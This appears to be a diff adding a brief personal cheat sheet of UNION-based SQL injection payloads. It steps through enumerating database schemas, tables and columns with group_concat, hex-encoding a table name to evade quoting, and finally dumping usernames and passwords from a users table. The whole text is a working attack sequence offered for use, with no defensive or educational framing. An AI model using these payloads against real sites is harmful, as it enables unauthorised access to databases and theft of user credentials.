@@ -1,0 +1,14 @@
+----steps to dump the data using group_concat-----------
+
+test' Union select 1,2,3 from table_name
+test' Union select 1,group_concat(schema_name),3 from information_schema.schemata
+test' Union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()
+test' Union select 1,group_concat(column_name),3 from information_schema.columns where table_name=users
+test' Union select 1,2,3,4,group_concat(column_name),6 from information_schema.columns where table_name=0x7573657273
+
+site: https://codebeautify.org/ [string to hex]
+
+0x[table name to hex]--->>0x7573657273
+
+test' Union select 1,group_concat(username,0x3a3a,password),3 from users
+
